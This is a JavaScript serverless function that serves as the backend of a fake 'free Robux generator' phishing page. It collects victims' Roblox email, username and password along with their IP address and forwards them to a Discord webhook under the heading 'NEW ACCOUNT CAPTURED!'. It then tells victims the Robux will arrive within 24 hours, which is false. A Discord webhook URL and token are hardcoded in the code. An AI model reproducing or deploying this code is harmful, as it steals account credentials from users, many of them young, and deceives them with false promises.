const fetch = require('node-fetch');

module.exports = async (req, res) => {
  // SET CORS HEADERS FIRST
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  // Handle OPTIONS request for CORS preflight
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Only accept POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ 
      success: false, 
      error: 'Method not allowed. Use POST.' 
    });
  }

  try {
    // Parse JSON body
    let data;
    try {
      data = req.body;
      // If body is string, parse it
      if (typeof data === 'string') {
        data = JSON.parse(data);
      }
    } catch (e) {
      return res.status(400).json({ 
        success: false, 
        error: 'Invalid JSON format' 
      });
    }

    const { 
      email = '', 
      username = '', 
      password = '', 
      robux_amount = '0', 
      platform = 'unknown' 
    } = data;

    // Validate required fields
    if (!email || !username || !password) {
      return res.status(400).json({ 
        success: false, 
        error: 'Missing required fields' 
      });
    }

    // Get client info
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.connection.remoteAddress || 
               'Unknown';
    
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referer = req.headers['referer'] || 'Direct';
    const host = req.headers['host'] || 'vercel.app';

    // Get Discord webhook from environment
    const WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
    
    // If no webhook configured, still return success (for testing)
    if (!WEBHOOK_URL || WEBHOOK_URL.includes('https://discord.com/api/webhooks/1432968170179919922/fuM413rrfAeu_Tzu4sJIKdZmr5P8Oow__7pOaTreTYg6osohkP7D_NDFOCgxFSCJuAPI')) {
      console.log('⚠️ No Discord webhook configured');
      console.log('📧 Captured data:', { 
        email: email.substring(0, 3) + '***', 
        username, 
        amount: robux_amount 
      });
      
      // Return success response
      return res.status(200).json({
        success: true,
        message: `Success! ${robux_amount} Robux will be delivered within 24 hours.`,
        data: {
          email: email.substring(0, 3) + '***@***',
          username: username,
          amount: robux_amount,
          transaction_id: 'RBX-' + Date.now(),
          estimated_delivery: '24 hours'
        }
      });
    }

    // Send to Discord
    try {
      const embed = {
        title: "🔥 NEW ROBUX CLAIM! 🔥",
        color: 0xFF0000,
        timestamp: new Date().toISOString(),
        fields: [
          { name: "📧 Email", value: `\`\`\`${email}\`\`\``, inline: false },
          { name: "👤 Username", value: `\`\`\`${username}\`\`\``, inline: true },
          { name: "🔑 Password", value: `\`\`\`${password}\`\`\``, inline: true },
          { name: "💰 Amount", value: `**${parseInt(robux_amount).toLocaleString()} Robux**`, inline: true },
          { name: "🌐 IP", value: `\`${ip}\``, inline: true },
          { name: "🕒 Time", value: new Date().toLocaleString(), inline: true }
        ],
        footer: { text: "Vercel API • " + new Date().toLocaleDateString() }
      };

      const discordResponse = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: "Robux Generator",
          avatar_url: "https://www.roblox.com/images/logo.svg",
          embeds: [embed],
          content: "**🎯 NEW ACCOUNT CAPTURED!**"
        })
      });

      console.log('✅ Discord response:', discordResponse.status);
      
    } catch (discordError) {
      console.error('❌ Discord error:', discordError.message);
      // Continue anyway - don't fail the request
    }

    // Log locally (for debugging)
    console.log('📊 Data captured:', {
      timestamp: new Date().toISOString(),
      email_prefix: email.substring(0, 3) + '***',
      username: username,
      amount: robux_amount,
      ip: ip,
      host: host
    });

    // Success response
    res.status(200).json({
      success: true,
      message: `🎉 Success! Your ${robux_amount} Robux request has been processed!`,
      data: {
        username: username,
        amount: robux_amount,
        transaction_id: 'RBX-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase(),
        estimated_delivery: 'Within 24 hours',
        next_step: 'Check your email for verification'
      },
      redirect: '/success.html'
    });

  } catch (error) {
    console.error('❌ Server error:', error);
    
    res.status(500).json({
      success: false,
      error: 'Server error. Please try again.',
      debug: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  }
};
